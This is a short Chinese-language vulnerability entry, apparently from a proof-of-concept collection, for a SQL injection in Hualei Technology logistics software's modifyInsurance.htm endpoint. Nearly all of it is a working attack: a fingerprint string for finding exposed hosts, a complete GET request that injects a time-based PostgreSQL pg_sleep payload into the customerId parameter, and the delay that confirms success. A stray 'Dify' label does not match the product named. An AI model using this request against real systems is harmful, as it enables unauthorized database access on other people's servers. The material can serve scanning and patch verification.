# 华磊科技物流-modifyInsurance-sql注入漏洞

Dify ｜ SQL注入 ｜ —
- **指纹**：`body="l_c_bar"`
- **请求**：`GET /modifyInsurance.htm?documentCode=-1&insuranceValue=-1&customerId=-1+and+1=(select+1+from+pg_sleep(6)) HTTP/1.1`
- **响应特征**：200 延时时间>=5s